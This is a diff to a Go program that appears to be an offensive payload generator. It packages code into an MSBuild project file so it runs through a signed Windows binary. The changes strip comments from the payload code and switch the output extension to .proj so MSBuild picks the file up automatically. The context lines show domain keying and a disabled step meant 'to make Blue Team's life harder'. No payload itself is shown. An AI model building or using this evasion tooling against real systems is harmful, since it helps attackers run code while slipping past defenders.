@@ -13,6 +13,7 @@ import (
 	"strings"
 	"text/template"
 	"time"
+	"regexp"
 )
 
 var version = "1.6"
@@ -117,8 +118,7 @@ func main() {
 	}
 
 	// the MSBuild template code will have access to {{.Payload}}, {{.Key}} and {{.Hash}}
-	MSBuildTemplate := `
-	<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+	MSBuildTemplate := `<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
 	<Target Name="MsUpdate">
 	   <ClassRunner/>
 	</Target>
@@ -189,6 +189,8 @@ func main() {
 
 		//fmt.Printf("[+] Stripping newline characters to make Blue Team's life harder ... ")
 		//MSBuildTemplate = strings.Replace(MSBuildTemplate, "\r\n", "", -1)
+		re := regexp.MustCompile("(?s)//.*?\n|/\\*.*?\\*/")
+    	payloadCode = re.ReplaceAll(payloadCode, nil)
 
 		if len(domainKey) > 0 {
 			fmt.Printf("[+] Keying to domain %s...", domainKey)
@@ -210,7 +212,7 @@ func main() {
 
 		if outFilename == "" {
 			t := time.Now()
-			outFilename = "payload" + t.Format("20060102150405") + ".xml"
+			outFilename = "payload" + t.Format("20060102150405") + ".proj"
 		}
 		outfile, err := os.Create(outFilename)
 		check(err)
@@ -219,5 +221,6 @@ func main() {
 		outfile.Close()
 		fmt.Println("Done")
 		fmt.Printf("[+] Run with: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe .\\%s\n", outFilename)
+		fmt.Printf("[+] If you don't specify a project file, MSBuild searches the current working directory for a file name extension that ends in proj and uses that file.")
 	}
 }
